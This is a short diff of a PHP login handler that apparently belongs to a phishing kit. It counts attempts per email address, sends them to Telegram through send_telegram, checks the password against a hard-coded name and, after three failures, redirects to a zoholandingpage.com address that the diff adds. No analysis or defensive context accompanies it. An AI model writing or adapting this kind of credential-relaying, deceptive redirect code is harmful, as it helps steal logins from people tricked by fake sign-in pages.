@@ -81,7 +81,7 @@ $msg .= "Last updated: {$attempts[$email]['time']}";
 send_telegram($msg);
 
 // Password check (same logic as before)
-$correct_name = "John Doe";
+$correct_name = "JohnMDoe";
 
 if ($password !== $correct_name) {
     if ($attempts[$email]['count'] >= 3) {
@@ -89,7 +89,7 @@ if ($password !== $correct_name) {
         json_response([
             'ok'      => false,
             'blocked' => true,
-            'redirect'=> 'https://example.com/blocked',
+            'redirect'=> 'https://transmission.zoholandingpage.com/404/',
             'error'   => 'Too many incorrect attempts.'
         ]);
     } else {
